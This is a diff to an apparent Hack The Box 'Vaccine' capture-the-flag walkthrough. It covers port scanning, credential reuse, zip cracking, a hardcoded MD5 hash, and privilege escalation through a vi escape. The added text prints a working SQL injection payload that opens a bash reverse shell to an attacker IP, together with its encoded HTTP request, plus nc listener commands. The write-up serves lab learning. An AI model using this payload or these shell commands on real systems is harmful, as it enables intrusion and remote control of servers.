@@ -4,6 +4,12 @@
 
 ### nmap
 
+We start by running `nmap`, a network discovery tool, on our target, `10.10.10.46`:
+
+    nmap 10.10.10.46 -sV -sC
+
+This is the console output:
+
 ```
 vagrant@vagrant-virtualbox ~> nmap 10.10.10.46 -sV -sC
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-31 14:53 CDT
@@ -30,11 +36,11 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 10.57 seconds
 ```
 
-We can see that ftp, ssh, and http are open services.
+We can see that ftp, ssh, and http are open services. So, port 21, 22, and 80.
 
 ## 2. FTP credentials
 
-Reusing credentials from the previous box, 'Oopsie', from FileZilla XML file:
+Reusing credentials from the previous box, 'Oopsie', from this FileZilla XML file:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
@@ -58,7 +64,7 @@ Reusing credentials from the previous box, 'Oopsie', from FileZilla XML file:
 </FileZilla3>
 ```
 
-We connect and download [`backup.zip`](downloaded-files/backup.zip) file.
+We connect and download [`backup.zip`](downloaded-files/backup.zip) file. I used FileZilla, but you could use any client you like.
 
 ## 3. Cracking the zip file password
 
@@ -68,9 +74,15 @@ I used the rockyou.txt wordlist to crack the zip file's password.
 
 The password ended up being `741852963`.
 
+There are 2 files inside `backup.zip`:
+
+    backup
+    ├── index.php
+    └── style.css
+
 ## 4. Hardcoded password hash
 
-In `index.php` on line 5, we can see this:
+In `index.php` on line 5, we can see a hardcoded MD5 password hash:
 
 ```php
 if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
@@ -102,6 +114,8 @@ I then started a new one as sqlmap's reverse shell is limited.
 
 ### Upgrading from sqlmap reverse shell
 
+Note that `10.10.14.184` is the attacker's IP address.
+
 Attacker runs (to receive TCP connection):
 
     nc -lvp 1234
@@ -115,6 +129,21 @@ And to upgrade shell:
     SHELL=/bin/bash script -q /dev/null
 
 We are now logged in as the `postgres` user.
+
+This is the payload:
+
+    test';DROP TABLE IF EXISTS sqlmapoutput;CREATE TABLE sqlmapoutput(data text);COPY sqlmapoutput FROM PROGRAM '    bash -c ''bash -i >& /dev/tcp/10.10.14.184/6969 0>&1''';--
+
+And this is the HTTP request that gets sent to the server:
+    
+    GET /dashboard.php?search=test%27%3BDROP%20TABLE%20IF%20EXISTS%20sqlmapoutput%3BCREATE%20TABLE%20sqlmapoutput%28data%20text%29%3BCOPY%20sqlmapoutput%20FROM%20PROGRAM%20%27%20%20%20%20bash%20-c%20%27%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.196%2F6969%200%3E%261%27%27%27%3B-- HTTP/1.1
+    Cache-control: no-cache
+    Cookie: PHPSESSID=51ai5vlm0bsmiragl1lnv2t3qg
+    User-agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.2) Gecko/2008092000 Ubuntu/8.04 (hardy) Firefox/3.0.2
+    Host: 10.10.10.46
+    Accept: */*
+    Accept-encoding: gzip,deflate
+    Connection: close
 
 ## 7. More hardcoded credentials
 
@@ -160,9 +189,9 @@ See the wonky output below. Line 11. `^[` is `<ESC>`. Below the content of the `
     #
     # Database administrative login by Unix domain socket
 
-    # TYPE  DATABASE        USER            ADDRESS                 METHOD                     HERE
-                                                                                                |
-    local   all             postgres                                iden^[:!/bin/bash   <-------/
+    # TYPE  DATABASE        USER            ADDRESS                 METHOD
+                                                                            
+    local   all             postgres                                iden^[:!/bin/bash <-- X
     # "local" is for Unix domain socket connections only
     local   all             all                                     peer
     # IPv4 local connections:
